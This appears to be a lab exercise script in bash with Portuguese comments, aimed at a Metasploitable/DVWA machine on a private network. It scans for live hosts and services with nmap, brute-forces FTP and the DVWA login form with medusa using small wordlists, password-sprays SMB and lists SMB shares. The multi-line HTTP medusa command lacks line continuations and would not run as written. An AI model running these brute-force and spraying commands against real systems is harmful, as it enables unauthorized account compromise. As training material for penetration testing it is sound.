#!/bin/bash

nmap -v -sn 192.168.56.100-200 | grep 192
# Varredura de rede para descoberta de hosts ativos.

nmap -sV -p 21,22,80,445,139 192.168.56.101
# verificar quais servições estão sendo utilizados no ip identificado.

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
# lista genérica de possíveis usuários.

echo -e "123456\npassword\nmsfadmin" > pass.txt
# lista de senhas genéricas usuais.

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
# uso do medusa para força bruta no ftp.

ftp 192.168.56.101
# comando para entrar no ftp.

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http
-m PAGE: '/dvwa/login.php'
-m FORM: 'username=^USER^&password=^PASS^&Login=Login'
-m 'FAIL=Login failed' -t 6
# Ataque de força bruta em formulário de autenticação Web (DVWA).

echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
# lista senhas spray.

medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
# Execução de Password Spraying no serviço SMB/Samba.

smbclient -L //192.168.56.101 -U msfadmin
# comando para adentrar no SMB.
